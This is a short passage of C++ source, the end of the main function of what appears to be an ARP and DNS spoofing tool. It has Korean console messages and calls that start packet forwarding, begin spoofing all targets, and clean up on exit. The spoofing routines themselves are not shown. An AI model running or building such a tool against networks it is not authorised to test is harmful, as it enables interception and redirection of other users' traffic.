    spoofer->start_packet_forwarding();
    spoofer->start_spoofing_all();
    std::cout << "실행 중... (Ctrl+C로 종료)" << std::endl;
    std::cout << "ARP 스푸핑 및 DNS 스푸핑 활성화" << std::endl;
    while (global_running)
        sleep(1);
    spoofer->stop_all();
    delete spoofer;
    ArpSpoofer::disable_ip_forwarding();
    std::cout << "프로그램 정상 종료" << std::endl;
    return 0;
}
